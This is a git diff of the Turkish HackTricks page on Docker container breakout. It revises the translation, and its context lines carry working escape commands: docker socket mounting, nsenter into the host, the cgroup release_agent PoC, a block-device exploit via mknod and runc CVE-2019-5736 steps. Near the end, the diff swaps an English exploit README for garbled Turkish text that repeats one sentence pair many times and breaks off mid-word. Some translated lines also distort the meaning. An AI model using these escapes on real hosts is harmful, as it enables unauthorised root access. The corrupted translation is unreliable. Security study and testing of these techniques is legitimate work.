@@ -6,18 +6,18 @@
 
 HackTricks'ı desteklemenin diğer yolları:
 
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
-* [**Resmi PEASS & HackTricks ürünlerini edinin**](https://peass.creator-spring.com)
+* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
 * [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* 💬 **Discord grubuna** katılın](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **bizi** **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
+* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
 
-<figure><img src="../../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçları tarafından desteklenen ve **iş akışlarını otomatikleştiren** işleri kolayca yapın.\
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
 Bugün Erişim Alın:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -26,13 +26,13 @@ Bugün Erişim Alın:
 
 * [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Ayrıca **konteynerleri numaralandırabilir**
 * [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Bu araç, içinde bulunduğunuz konteyneri numaralandırmak için oldukça **yararlıdır ve hatta otomatik olarak kaçmaya çalışır**
-* [**amicontained**](https://github.com/genuinetools/amicontained): Kaçmak için konteynerin sahip olduğu ayrıcalıkları almanıza yardımcı olan faydalı bir araç
+* [**amicontained**](https://github.com/genuinetools/amicontained): Konteynerin sahip olduğu ayrıcalıkları almak için kullanışlı bir araç, kaçış yollarını bulmak için
 * [**deepce**](https://github.com/stealthcopter/deepce): Konteynerlerden numaralandırmak ve kaçmak için araç
 * [**grype**](https://github.com/anchore/grype): Görüntüye yüklenen yazılımda bulunan CVE'leri alın
 
-## Bağlanmış Docker Soketinden Kaçış
+## Bağlanmış Docker Soket Kaçışı
 
-Eğer **bir şekilde docker soketinin** docker konteyneri içine bağlandığını bulursanız, bundan kaçabilirsiniz.\
+Eğer bir şekilde **docker soketinin** docker konteyneri içine bağlandığını bulursanız, bundan kaçabilirsiniz.\
 Bu genellikle, bir nedenle docker işlemlerini gerçekleştirmek için docker daemonına bağlanması gereken docker konteynerlerinde meydana gelir.
 ```bash
 #Search the socket
@@ -54,10 +54,10 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
 {% hint style="info" %}
-Eğer **docker soketi beklenmedik bir konumdaysa**, yine de **`docker`** komutunu **`-H unix:///path/to/docker.sock`** parametresi ile kullanarak iletişim kurabilirsiniz.
+Eğer **docker soketi beklenmedik bir konumdaysa**, yine de **`docker`** komutunu **`-H unix:///path/to/docker.sock`** parametresiyle kullanarak onunla iletişim kurabilirsiniz.
 {% endhint %}
 
-Docker daemon ayrıca bir portta dinleyebilir (varsayılan olarak 2375, 2376) veya Systemd tabanlı sistemlerde Docker daemon ile iletişim Systemd soketi `fd://` üzerinden gerçekleşebilir.
+Docker daemon ayrıca bir portta da dinleyebilir (varsayılan olarak 2375, 2376) veya Systemd tabanlı sistemlerde Docker daemon ile iletişim Systemd soketi `fd://` üzerinden gerçekleşebilir.
 
 {% hint style="info" %}
 Ayrıca, diğer yüksek seviye çalışma zamanlarının çalışma zamanı soketlerine dikkat edin:
@@ -74,11 +74,11 @@ Ayrıca, diğer yüksek seviye çalışma zamanlarının çalışma zamanı soke
 
 Konteynerin yeteneklerini kontrol etmelisiniz, eğer aşağıdaki yeteneklerden herhangi birine sahipse, ondan kaçabilirsiniz: **`CAP_SYS_ADMIN`**, **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
 
-Şu anda konteyner yeteneklerini kontrol edebilirsiniz **daha önce bahsedilen otomatik araçlar** veya:
+Şu anda konteynerin yeteneklerini kontrol edebilirsiniz **daha önce bahsedilen otomatik araçlar** veya:
 ```bash
 capsh --print
 ```
-Aşağıdaki sayfada **linux yetenekleri** hakkında daha fazla bilgi edinebilir ve bunları kötüye kullanarak ayrıcalıklardan kaçınabilir/aitalabilirsiniz:
+Aşağıdaki sayfada **linux yetenekleri** hakkında daha fazla bilgi edinebilir ve bunları kötüye kullanarak ayrıcalıklardan kaçabilir/yalnızlaştırabilirsiniz:
 
 {% content-ref url="../../linux-capabilities.md" %}
 [linux-capabilities.md](../../linux-capabilities.md)
@@ -86,7 +86,7 @@ Aşağıdaki sayfada **linux yetenekleri** hakkında daha fazla bilgi edinebilir
 
 ## Ayrıcalıklı Konteynerden Kaçış
 
-Ayrıcalıklı bir konteyner, `--privileged` bayrağı ile oluşturulabilir veya belirli savunmalar devre dışı bırakılarak:
+Ayrıcalıklı bir konteyner, `--privileged` bayrağı eklenerek veya belirli savunmalar devre dışı bırakılarak oluşturulabilir:
 
 * `--cap-add=ALL`
 * `--security-opt apparmor=unconfined`
@@ -96,19 +96,19 @@ Ayrıcalıklı bir konteyner, `--privileged` bayrağı ile oluşturulabilir veya
 * `--userns=host`
 * `--uts=host`
 * `--cgroupns=host`
-* `/dev` bağla
+* `/dev` bağlama
 
-`--privileged` bayrağı, konteyner güvenliğini önemli ölçüde düşürerek **sınırsız cihaz erişimi** sunar ve **birçok korumayı atlar**. Detaylı bir açıklama için, `--privileged`'ın tam etkileri hakkındaki belgelendirmeye başvurun.
+`--privileged` bayrağı konteyner güvenliğini önemli ölçüde düşürür, **sınırsız cihaz erişimi** sunar ve **birçok korumayı atlar**. Detaylı bir açıklama için `--privileged`'ın tam etkileri hakkındaki belgelendirmeye başvurun.
 
 {% content-ref url="../docker-privileged.md" %}
 [docker-privileged.md](../docker-privileged.md)
 {% endcontent-ref %}
 
-### Ayrıcalıklı + hostPID
+### Privileged + hostPID
 
-Bu izinlerle, sadece **kök olarak çalışan bir işlem alanına geçebilirsiniz** örneğin init (pid:1) gibi, sadece şunu çalıştırarak: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
+Bu izinlerle sadece **kök olarak çalışan bir işlem alanına geçebilirsiniz** örneğin init (pid:1) gibi sadece şunu çalıştırarak: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
 
-Bunu bir konteynerde test ederek deneyin:
+Bunu bir konteynerde test etmek için şunu çalıştırın:
 ```bash
 docker run --rm -it --pid=host --privileged ubuntu bash
 ```
@@ -122,11 +122,11 @@ docker run --rm -it --privileged ubuntu bash
 ```
 #### Diski Bağlama - Poc1
 
-İyi yapılandırılmış docker konteynerleri **fdisk -l** gibi komutlara izin vermez. Ancak yanlış yapılandırılmış bir docker komutunda `--privileged` veya `--device=/dev/sda1` bayrağı belirtildiğinde, ana sürücüyü görmek için ayrıcalıkları almak mümkündür.
+İyi yapılandırılmış docker konteynerleri **fdisk -l** gibi komutlara izin vermez. Ancak yanlış yapılandırılmış bir docker komutunda `--privileged` veya `--device=/dev/sda1` bayrağı büyük harflerle belirtildiğinde, ana sürücüyü görmek için ayrıcalıkları elde etmek mümkündür.
 
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
-Bu nedenle, ana makineyi ele geçirmek basittir:
+Bu nedenle ana makineyi ele geçirmek basittir:
 ```bash
 mkdir -p /mnt/hola
 mount /dev/sda1 /mnt/hola
@@ -135,7 +135,7 @@ Ve işte! Artık ana bilgisayarın dosya sistemine `/mnt/hola` klasöründe bağ
 
 #### Disk Bağlama - Poc2
 
-Kapsayıcı içinde, bir saldırgan kümenin oluşturduğu yazılabilir hostPath birimine erişim sağlamaya çalışabilir ve bu şekilde temel ana bilgisayar işletim sistemine daha fazla erişim elde etmeye çalışabilir. Aşağıda, bu saldırgan vektörünü kullanarak bu kapsayıcı içinde kontrol edebileceğiniz bazı yaygın şeyler bulunmaktadır:
+Kapsayıcı içinde, bir saldırgan kümenin oluşturduğu yazılabilir hostPath birimini kullanarak altta yatan ana bilgisayar işletim sistemine daha fazla erişim elde etmeye çalışabilir. Aşağıda, bu saldırgan vektörünü kullanarak kontrol edebileceğiniz yaygın bazı şeyler bulunmaktadır.
 ```bash
 ### Check if You Can Write to a File-system
 echo 1 > /proc/sysrq-trigger
@@ -192,7 +192,11 @@ sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
 # Reads the output
 cat /o
 ```
+{% endcode %}
+
 #### Oluşturulan release_agent'i Kullanarak Ayrıcalıklı Kaçış ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
+
+{% code title="İkinci PoC" %}
 ```bash
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
@@ -244,10 +248,10 @@ Teknik açıklamasını bulun:
 
 #### Bilinen yol olmadan release\_agent'i kötüye kullanarak ayrıcalıklı kaçış - PoC3
 
-Önceki saldırılarda **konumun mutlak yolu** ifşa edilmiştir. Bununla birlikte, bu her zaman geçerli değildir. **Ana bilgisayar içinde konteynerin mutlak yolunu bilmediğiniz durumlarda** bu tekniği kullanabilirsiniz:
+Önceki saldırılarda **konumunun kesin yolu** ifşa edilmiştir. Bununla birlikte, bu her zaman geçerli değildir. **Ana bilgisayar içinde konteynerin kesin yolunu bilmediğiniz durumlarda** bu tekniği kullanabilirsiniz:
 
 {% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
-[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
+[release\_agent-exploit-relative-paths-to-pids.md](release_agent-exploit-relative-paths-to-pids.md)
 {% endcontent-ref %}
 ```bash
 #!/bin/sh
@@ -338,7 +342,7 @@ root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ```
 #### Ayrıcalıklı Kaçış Hassas Bağlantıları Kötüye Kullanma
 
-Altta yatan ana bilgisayar hakkında bilgi veren **çeşitli dosyalar** bağlanabilir. Bazıları, hatta **ana bilgisayarın bir şeyi gerçekleştirmesi gerektiğinde yürütülecek bir şeyi belirtebilir** (bu da bir saldırganın konteynerden kaçmasına izin verebilir).\
+Altta yatan ana bilgisayar hakkında bilgi veren **çeşitli dosyalar** bağlanabilir. Bazıları, hatta **ana bilgisayar tarafından bir şeyin gerçekleştiğinde yürütülmesi gerektiğini belirtebilir** (bu da bir saldırganın konteynerden kaçmasına izin verebilir).\
 Bu dosyaların kötüye kullanımı şunu mümkün kılar:
 
 * release\_agent (zaten önce ele alındı)
@@ -355,14 +359,14 @@ Ancak, bu sayfada kontrol etmek için **diğer hassas dosyaları** bulabilirsini
 
 ### Keyfi Bağlantılar
 
-Birkaç durumda, **konteynerin ana bilgisayardan birim bağlandığını** göreceksiniz. Bu birim doğru şekilde yapılandırılmamışsa, **duyarlı verilere erişebilir/değiştirebilirsiniz**: Gizli bilgileri okuyun, ssh authorized\_keys dosyasını değiştirin...
+Birkaç durumda, **konteynerin ana bilgisayardan birim bağlandığını** göreceksiniz. Bu birim doğru yapılandırılmamışsa, **duyarlı verilere erişebilir/değiştirebilirsiniz**: Gizli bilgileri okuyun, ssh authorized\_keys dosyasını değiştirin...
 ```bash
 docker run --rm -it -v /:/host ubuntu bash
 ```
-### 2 kabuk ve ana bilgisayar bağlama noktası ile ayrıcalık yükseltme
+### 2 kabuk ve ana bilgisayar bağlama ile ayrıcalık yükseltme
 
-Eğer **bir konteyner içinde kök erişiminiz** varsa ve ana bilgisayardan bazı klasörler bağlanmışsa ve **ana bilgisayarda ayrıcalıklı olmayan bir kullanıcı olarak kaçmayı başardıysanız** ve bağlanmış klasöre okuma erişiminiz varsa.\
-**Konteyner** içinde **bağlanmış klasörde bir bash suid dosyası oluşturabilir** ve bunu **ana bilgisayardan çalıştırarak** ayrıcalık yükseltebilirsiniz.
+Eğer **ana bilgisayar tarafından bağlanmış bir klasöre sahip bir konteyner içinde root erişiminiz** varsa ve **ana bilgisayarda ayrıcalıklı olmayan bir kullanıcı olarak kaçmayı başardıysanız** ve bağlanmış klasör üzerinde okuma erişiminiz varsa.\
+**Konteyner** içinde **bağlanmış klasörde** bir **bash suid dosyası** oluşturabilir ve **ana bilgisayardan** bunu çalıştırarak ayrıcalık yükseltebilirsiniz.
 ```bash
 cp /bin/bash . #From non priv inside mounted folder
 # You need to copy it from the host as the bash binaries might be diferent in the host and in the container
@@ -372,12 +376,11 @@ bash -p #From non priv inside mounted folder
 ```
 ### 2 kabuk ile Yetki Yükseltme
 
-Eğer bir konteyner içinde **root erişiminiz** varsa ve **özne olmayan bir kullanıcı olarak ana makineye kaçmayı başardıysanız**, konteyner içinde **MKNOD yeteneğiniz** varsa (varsayılan olarak vardır) ve [**bu yazıda açıklandığı gibi**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) her iki kabuğu da kötüye kullanarak **ana makinede yetki yükseltebilirsiniz**.\
-Bu yetenekle, konteyner içindeki root kullanıcısına **blok cihaz dosyaları oluşturma izni** verilir. Cihaz dosyaları, **altta yatan donanıma ve çekirdek modüllerine erişmek** için kullanılan özel dosyalardır. Örneğin, /dev/sda blok cihaz dosyası, **sistemin diskindeki ham verileri okuma** izni verir.
+Eğer bir konteyner içinde **root erişiminiz varsa** ve **özne olmayan bir kullanıcı olarak ana makineye kaçmayı başardıysanız**, konteyner içinde MKNOD yeteneğine sahipseniz (varsayılan olarak vardır), her iki kabuğu da kötüye kullanarak **ana makinede yetki yükseltebilirsiniz**. Bu yeteneğe sahip olmanız durumunda, konteyner içindeki root kullanıcısına **blok cihaz dosyaları oluşturma izni** verilir. Cihaz dosyaları, **altta yatan donanıma ve çekirdek modüllerine erişmek** için kullanılan özel dosyalardır. Örneğin, /dev/sda blok cihaz dosyası, **sistem diskindeki ham verileri okuma** izni verir.
 
-Docker, konteynerler içinde blok cihazlarının kötüye kullanımına karşı koruma sağlamak için **blok cihazı okuma/yazma işlemlerini engelleyen** bir cgroup politikası uygular. Bununla birlikte, bir blok cihazı **konteyner içinde oluşturulursa**, dışarıdan **/proc/PID/root/** dizini aracılığıyla erişilebilir hale gelir. Bu erişim için, **işlem sahibinin hem içeride hem de dışarıda aynı olması** gerekir.
+Docker, konteynerler içinde blok cihazlarının yanlış kullanımına karşı koruma sağlamak için **blok cihazı okuma/yazma işlemlerini engelleyen** bir cgroup politikası uygular. Bununla birlikte, bir blok cihazı **konteyner içinde oluşturulursa**, dışarıdan **/proc/PID/root/** dizini aracılığıyla erişilebilir hale gelir. Bu erişim, **işlem sahibinin hem içeride hem de dışarıda aynı olması** gerektirir.
 
-Bu [**yazıdan**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/) bir **sömürü** örneği:
+Bu [**yazıda**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames) verilen **sömürü** örneği:
 ```bash
 # On the container as root
 cd /
@@ -440,37 +443,37 @@ lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
 # You can open the secret filw with:
 cat /proc/635813/fd/4
 ```
-Ayrıca **işlemleri sonlandırabilir ve bir Hizmet Dışı (DoS) durumuna neden olabilirsiniz**.
+Ayrıca **işlemleri sonlandırabilir ve Bir Hizmet Reddi (DoS) saldırısına neden olabilirsiniz**.
 
 {% hint style="warning" %}
-Eğer bir şekilde **konteyner dışındaki bir işlem üzerinde ayrıcalıklı erişiminiz varsa**, `nsenter --target <pid> --all` veya `nsenter --target <pid> --mount --net --pid --cgroup` gibi bir şey çalıştırabilir ve **umarım olmayan** aynı ns kısıtlamalarına sahip bir kabuk çalıştırabilirsiniz.
+Eğer bir şekilde **konteyner dışındaki bir işlem üzerinde ayrıcalıklı erişiminiz varsa**, `nsenter --target <pid> --all` veya `nsenter --target <pid> --mount --net --pid --cgroup` gibi bir şey çalıştırabilir ve **umarım hiç olmayan** aynı ns kısıtlamalarına sahip bir kabuk çalıştırabilirsiniz.
 {% endhint %}
 
 ### hostNetwork
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
-Eğer bir konteyner Docker [ana ağ sürücüsüyle yapılandırılmışsa (`--network=host`)](https://docs.docker.com/network/host/), o konteynerin ağ yığını Docker ana bilgisayarından izole edilmez (konteyner ana bilgisayarın ağ ad alanını paylaşır) ve konteynere ayrı bir IP adresi atanmaz. Başka bir deyişle, **konteyner tüm hizmetleri doğrudan ana bilgisayarın IP'sine bağlar**. Ayrıca konteyner, paylaşılan arayüz üzerinden gönderilen ve alınan **TÜM ağ trafiğini yakalayabilir `tcpdump -i eth0`**.
+Eğer bir konteyner Docker [ana ağ sürücüsüyle yapılandırılmışsa (`--network=host`)](https://docs.docker.com/network/host/), o konteynerin ağ yığını Docker ana bilgisayarından izole edilmez (konteyner ana bilgisayarın ağ ad alanını paylaşır) ve konteynere ayrı bir IP adresi atanmaz. Başka bir deyişle, **konteyner tüm hizmetleri doğrudan ana bilgisayarın IP'sine bağlar**. Ayrıca konteyner, paylaşılan arayüz üzerinde ana bilgisayarın gönderdiği ve aldığı **TÜM ağ trafiğini yakalayabilir `tcpdump -i eth0`**.
 
 Örneğin, bunu kullanarak ana bilgisayar ve meta veri örneği arasındaki trafiği **dinleyebilir ve hatta sahtekarlık yapabilirsiniz**.
 
 Aşağıdaki örneklerde olduğu gibi:
 
-* [Yazı: Google SRE ile nasıl iletişime geçilir: Bulut SQL'de bir kabuk bırakma](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
+* [Açıklama: Google SRE ile nasıl iletişime geçilir: Bulut SQL'de bir kabuk bırakma](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
 * [Meta veri servisi MITM, kök ayrıcalık yükseltmesine izin verir (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
 
-Ayrıca, ana bilgisayar içinde **localhost'a bağlı ağ hizmetlerine erişebilecek** veya hatta **düğümün meta veri izinlerine** erişebileceksiniz (bu, bir konteynerin erişebileceğinden farklı olabilir).
+Ayrıca, ana bilgisayar içinde **localhost'a bağlı ağ hizmetlerine erişebilecek** veya hatta **düğümün meta veri izinlerine erişebileceksiniz** (ki bunlar bir konteynerin erişebileceğinden farklı olabilir).
 
 ### hostIPC
 ```bash
 docker run --rm -it --ipc=host ubuntu bash
 ```
-`hostIPC=true` ile, ana bilgisayarın ara işlem iletişimi (IPC) kaynaklarına, örneğin `/dev/shm` içindeki **paylaşılan bellek** gibi, erişim elde edersiniz. Bu, aynı IPC kaynaklarının diğer ana bilgisayar veya kapsül süreçleri tarafından kullanıldığı yerlerde okuma/yazma yapmanıza olanak tanır. Bu IPC mekanizmalarını daha ayrıntılı incelemek için `ipcs` kullanın.
+`hostIPC=true` ile, ana bilgisayarın ara işlem iletişimi (IPC) kaynaklarına, örneğin `/dev/shm` içindeki **paylaşılan bellek** gibi, erişim sağlarsınız. Bu, aynı IPC kaynaklarının diğer ana bilgisayar veya kapsül işlemleri tarafından kullanıldığı yerlerde okuma/yazma yapmanıza olanak tanır. Bu IPC mekanizmalarını daha ayrıntılı incelemek için `ipcs` komutunu kullanın.
 
-* **/dev/shm'yi İnceleyin** - Bu paylaşılan bellek konumunda herhangi bir dosyayı arayın: `ls -la /dev/shm`
-* **Mevcut IPC tesislerini İnceleyin** - Kullanılan herhangi bir IPC tesisinin olup olmadığını `/usr/bin/ipcs` ile kontrol edebilirsiniz. Bunu kontrol etmek için: `ipcs -a`
+* **/dev/shm'yi İncele** - Bu paylaşılan bellek konumunda herhangi bir dosyayı arayın: `ls -la /dev/shm`
+* **Mevcut IPC tesislerini İncele** - Kullanılan herhangi bir IPC tesisinin olup olmadığını `/usr/bin/ipcs` ile kontrol edebilirsiniz. Şu şekilde kontrol edin: `ipcs -a`
 
-### Yetenekleri Kurtarın
+### Yetenekleri Kurtar
 
 Eğer **`unshare`** sistem çağrısı yasaklanmamışsa, tüm yetenekleri kurtarabilirsiniz:
 ```bash
@@ -482,9 +485,9 @@ cat /proc/self/status | grep CapEff
 
 [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) adresinde açıklanan ikinci teknik, kullanıcı ad alanlarıyla bağlantılı bağ montajlarını kötüye kullanarak ana makinedeki dosyaları etkilemenize (belirli bir durumda dosyaları silmenize) olanak tanır.
 
-<figure><img src="../../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturun ve otomatikleştirin.\
+[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını otomatikleştirin**.\
 Bugün Erişim Alın:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -493,14 +496,14 @@ Bugün Erişim Alın:
 
 ### Runc açığı (CVE-2019-5736)
 
-Eğer `docker exec`'i kök olarak çalıştırabilirseniz (muhtemelen sudo ile), CVE-2019-5736'yı kötüye kullanarak bir konteynerden kaçarak ayrıcalıkları yükseltmeyi deneyebilirsiniz (açık [burada](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Bu teknik temelde **ana makinedeki** _**/bin/sh**_ ikilisini **bir konteynerden üzerine yazacak**, bu nedenle docker exec'i çalıştıran herkes payload'ı tetikleyebilir.
+Eğer `docker exec`'i kök olarak çalıştırabilirseniz (muhtemelen sudo ile), CVE-2019-5736'yı kötüye kullanarak bir konteynerden kaçarak ayrıcalıkları yükseltmeyi deneyebilirsiniz (açık [burada](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Bu teknik temelde **ana makinedeki** _**/bin/sh**_ ikilisini bir **konteynerden üzerine yazar**, böylece docker exec çalıştıran herhangi biri yüklemeyi tetikleyebilir.
 
-Payload'ı değiştirin ve `go build main.go` ile main.go'yu derleyin. Oluşan ikili dosya docker konteynerine yürütme için yerleştirilmelidir.\
-Yürütme sırasında, `[+] Overwritten /bin/sh successfully` anında aşağıdakini ana makineden çalıştırmanız gerekir:
+Yüklemeyi değiştirin ve `go build main.go` ile main.go'yu derleyin. Oluşan ikili dosya, yürütme için docker konteynerine yerleştirilmelidir.\
+Yürütme sırasında, `[+] Overwritten /bin/sh successfully` anında aşağıdakini ana makineden yürütmeniz gerekir:
 
 `docker exec -it <container-adı> /bin/sh`
 
-Bu, main.go dosyasında bulunan payload'ı tetikleyecektir.
+Bu, main.go dosyasında bulunan yüklemeyi tetikleyecektir.
 
 Daha fazla bilgi için: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
 
@@ -512,10 +515,10 @@ Konteynerin savunmasız olabileceği diğer CVE'ler bulunabilir, bir liste [bura
 
 ### Docker Kaçış Yüzeyi
 
-* **Ad alanları:** İşlem, ad alanları aracılığıyla diğer işlemlerden **tamamen ayrılmalıdır**, bu nedenle ad alanları nedeniyle diğer işlemlerle etkileşimden kaçınamayız (varsayılan olarak IPC'ler aracılığıyla iletişim kuramaz, unix soketleri, ağ hizmetleri, D-Bus, diğer işlemlerin `/proc`'si).
+* **Ad alanları:** İşlem, ad alanları aracılığıyla diğer işlemlerden **tamamen ayrılmalıdır**, bu nedenle ad alanları nedeniyle diğer işlemlerle etkileşimden kaçınamayız (varsayılan olarak IPC'ler aracılığıyla iletişim kuramaz, unix soketleri, ağ hizmetleri, D-Bus, diğer işlemlerin `/proc`'u).
 * **Kök kullanıcı**: Varsayılan olarak işlemi çalıştıran kullanıcı kök kullanıcıdır (ancak ayrıcalıkları sınırlıdır).
-* **Yetenekler:** Docker, aşağıdaki yetenekleri bırakır: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
-* **Syscall'ler:** Bunlar, **kök kullanıcının çağıramayacağı syscall'ler**dir (yeteneklerin eksikliği + Seccomp nedeniyle). Diğer syscall'lerden kaçmaya çalışmak için kullanılabilir.
+* **Yetenekler**: Docker, aşağıdaki yetenekleri bırakır: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
+* **Syscall'ler**: Bunlar, **kök kullanıcının** çağırabileceği syscall'lerdir (yetenek eksikliği + Seccomp nedeniyle). Kaçmaya çalışmak için diğer syscall'ler kullanılabilir.
 
 {% tabs %}
 {% tab title="x64 syscall'ler" %}
@@ -561,32 +564,7 @@ Konteynerin savunmasız olabileceği diğer CVE'ler bulunabilir, bir liste [bura
 ```
 {% endtab %}
 
-{% tab title="syscall_bf.c" %}Docker Breakout Privilege Escalation
-=====================================
-
-This directory contains a Docker breakout privilege escalation exploit. The exploit leverages a bug in the Linux kernel to escalate privileges from a Docker container to the host system.
-
-### Usage
-
-Compile the exploit code using the provided Makefile:
-
-```bash
-make
-```
-
-Run the compiled binary:
-
-```bash
-./syscall_bf
-```
-
-### Disclaimer
-
-This exploit is for educational purposes only. Misuse of this exploit on systems without authorization is illegal. The author is not responsible for any damages caused by the misuse of this exploit.
-
-### Credits
-
-This exploit was originally created by [Fernando Arnaboldi](https://github.com/fjaron).
+{% tab title="syscall_bf.c" %}Dosya sistemi çağrıları (syscall) kullanan bir program, Linux çekirdeğine doğrudan erişim sağlar. Bu, bir Docker konteynerinden kaçmak için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, 